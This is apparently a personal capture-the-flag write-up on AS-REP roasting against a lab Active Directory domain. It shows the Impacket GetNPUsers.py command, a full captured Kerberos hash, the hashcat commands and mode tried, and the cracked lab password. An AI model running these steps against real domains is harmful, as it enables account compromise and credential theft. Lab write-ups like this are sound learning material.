
Will exploit a feature in Kerberos (i.e. ASREPRosting)

What is  ASReproasting ?__?
- It occurs when a user account has the privilege "Does not require Pre-Authentication" set. 
- This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

I have already gather some accounts that looked juicy let''s try them out 
```
Accounts that really stand out are or kind of looks juicy to meee :
svc-admin@spookysec.local
administrator@spookysec.local
backup@spookysec.local
Administrator@spookysec.local
```

Took Name GetNPUsers.py from Impacket toolkit 
When we run the command
```
GetNPUsers.py -dc-ip 10.10.171.118  spookysec.local/svc-admin -no-pass
```
![[Pasted image 20230913201512.png]]

```
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5045689025cd6cc8339204bb9e488bba$a4e161834e4cc560dcc850647e1e2585ca295dccb447b573bba4598c3741a79ab08f8807cca4e1f84c643836b37732e9cb351e1250675025b0742f425f6e29a4c3a3cb072bc005b17b65b9b75c4b35011f0ad7f19ff70ea3974e8d7506a931651c3fd2f48823b69c94e5ed1132d9a5dbf223344c1b1fb59c7e2c787412215190f32a2cfae46e75e9963d213476fd1c2c5a9064647d7983e1e6281130e3b632aabc631f335d41c29fe6f0fbcb81f81f80bd7425cdfd0fcaa6e53ce80cf9ff56f0b50e5344ab7dee57f0cbad63a158402709cecbe35d9bc70c7eeb04d743478614c59bd6a5eb8a424b07020c67b7699e369961

```

Now we have to identify the hash module we have to use for that will run this command in hashcat
![[Pasted image 20230913201800.png]]
We have to look for the etype which is 23 in our case (i.e. We have 3 options 7500,13100,18200)
or 
https://hashcat.net/wiki/doku.php?id=example_hashes
![[Pasted image 20230913204434.png]]

Will copy the hash in the txt file and try to crack the hash using HashCat
We got the error with 7500 and 13100 
![[Pasted image 20230913202416.png]]

But Luckily we got away with 18200 so let's hope we can crack it with rockyou.txt
Not able to crack it in linux as i got this error 
* Device #1: Not enough allocatable device memory for this attack.
so will use to crack it with windows 

After Playing with different parameter i was able to run it with this
```
PS C:\Users\pabla\Downloads\hashcat-6.2.6> .\hashcat.exe -m 18200 -a 0 -D 2 .\hashes4.txt .\rockyou.txt -O
```

![[Pasted image 20230913203732.png]]
Password: management2005


